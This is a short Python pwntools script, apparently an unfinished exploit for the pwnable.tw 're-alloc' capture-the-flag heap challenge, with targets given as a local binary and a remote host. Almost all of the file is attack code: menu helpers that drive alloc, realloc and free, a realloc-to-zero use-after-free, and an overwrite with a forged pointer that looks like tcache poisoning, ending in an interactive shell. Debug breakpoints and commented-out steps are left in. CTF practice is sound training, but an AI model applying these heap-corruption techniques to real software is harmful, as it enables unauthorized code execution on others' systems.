

from pwn import *
import pdb
import sys


def alloc(idx, sz, cont):
  p.sendlineafter('Your choice: ', '1')
  p.sendlineafter('Index:', str(idx))
  p.sendlineafter('Size:', str(sz))
  p.sendlineafter('Data:', cont)

def realloc(idx, sz, cont=None):
  p.sendlineafter('Your choice: ', '2')
  p.sendlineafter('Index:', str(idx))
  p.sendlineafter('Size:', str(sz))
  if cont:
    p.sendlineafter('Data:', cont)

def free(idx):
  p.sendlineafter('Your choice: ', '3')
  p.sendlineafter('Index:', str(idx))

DEBUG = True

p = process('/home/len/pwnable/re-alloc')
elf = ELF('/lib/i386-linux-gnu/libc.so.6')

if not DEBUG:  
  p = remote('chall.pwnable.tw', 10106)
  elf = ELF('./libc_32.so.6')  
  

context.log_level = 'debug'


if __name__ == "__main__":
  pdb.set_trace()
  
  alloc(0, 0x78, 'a' * 0x70 + p64(0x40))
  alloc(1, 0x38, 'b' * 0x30 + p64(0x30))
  # realloc(0, 0x60, 'c' * 0x30)

  realloc(0, 0, 'c' * 0)
  # realloc(0, 0x30, p64(0x403ff5-8) + 'c' * 0x18)

  pdb.set_trace()
  realloc(0, 0x70, p64(0x403ff5-8) + 'd' * 0x28 + chr(0x40))
  free(1)
  alloc(1, 0x78, 'd')

  free(0)


  # realloc(0, 0, 'c' * 0)


  # free(1)

  p.interactive()